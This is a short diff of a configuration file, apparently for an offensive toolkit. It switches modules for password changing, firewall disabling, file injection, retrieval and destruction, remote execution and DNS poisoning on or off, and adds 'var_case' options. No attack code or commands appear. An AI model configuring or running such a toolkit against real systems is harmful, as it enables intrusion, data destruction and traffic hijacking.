@@ -39,7 +39,7 @@ change_nt_pwd = {
 # ->reconnaissance
 batch_recon = 0
 network_scan = 0
-sysinfo = 1
+sysinfo = 0
 
 # ->network based executions
 disable_firewall = 0
@@ -51,15 +51,20 @@ register_dns = 0
 
 # ->file utilities
 injector = {
-    'controller': 1,
+    'controller': 0,
+    'var_case': 0,
     'path': ""
 }
 retriever = {
-    'controller': 1,
+    'controller': 0,
+    'var_case': 0,
+    'var_case_dir': 0,
     'path': ""
 }
 destroyer = {
     'controller': 1,
+    'var_case': 0,
+    'var_case_dir': 0,
     'path': ""
 }
 
@@ -70,7 +75,7 @@ target_exec = {
     'path': ""
 }
 
-# ->DNS poisoning
+# ->DNS based attacks
 dns_poison = {
     'controller': 1,
     'entries': "" # research array inside an array
